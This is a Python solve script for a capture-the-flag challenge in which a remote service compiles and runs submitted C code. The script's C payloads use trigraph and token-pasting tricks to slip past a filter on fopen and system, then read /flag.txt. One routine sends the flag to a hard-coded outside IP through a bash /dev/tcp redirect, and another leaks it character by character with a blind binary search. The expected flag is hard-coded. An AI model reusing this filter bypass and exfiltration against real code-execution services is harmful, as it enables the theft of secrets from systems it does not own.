#!/usr/bin/env python3

import requests
URL = "http://localhost:3000"

MYSERVER_IP = "52.79.227.80"
MYSERVER_PORT = "12312"

def query(code):
    req = requests.post("{}/code".format(URL), data={"code":code})
    resp = req.json()
    return resp

def solve_with_server(MYSERVER_IP, MYSERVER_PORT):
    query("""char flag[1024];
char cmd[2048];
??=define cc(a,b) a??=??=b
cc(freo,pen)("/flag.txt", "r", stdin);
scanf("%s", flag);
snprintf(cmd, 2048, "/bin/bash -c \"echo \"%s\" > /dev/tcp/{}/{}\"", flag);
puts(cmd);
cc(sys,tem)(cmd);
    """.format(MYSERVER_IP, MYSERVER_PORT))
    #"SCTF{take-care-when-execute-unknown-code}"

def get_flag_len():
    left = 0
    right = 100
    # [left, right]
    while left < right:
        mid = (left+right)//2
        print (left, mid, right)
        code = """??=define cc(a,b) a??=??=b
        char flag[1024];
        cc(freo,pen)("/flag.txt", "r", stdin);
        scanf("%s", flag);

        int len = 0;
        while (flag[len]) len++;
        if (len > """ + str(mid) + """) {
        puts("2/3");
        }"""
        if query(code)[0] == True:
            left = mid+1
        else:
            right = mid
    return left
def chk_ch(idx):
    left = 0
    right = 128
    # [left, right]
    while left < right:
        mid = (left+right)//2
        print (left, mid, right)
        code = """??=define cc(a,b) a??=??=b
        char flag[1024];
        cc(freo,pen)("/flag.txt", "r", stdin);
        scanf("%s", flag);

        if (flag[""" + str(idx) + """] > """ + str(mid) + """) {
        puts("2/3");
        }"""
        if query(code)[0] == True:
            left = mid+1
        else:
            right = mid
    return chr(left)
def solve_with_blind():
    realflag='SCTF{take-care-when-execute-unknown-code}'
    length = get_flag_len()
    print ("FlagLength = {}".format(length))
    flag = ""
    for i in range(length):
        flag += chk_ch(i)
        print (flag)
    assert len(flag) == len(realflag)
    assert flag == realflag


solve_with_blind()
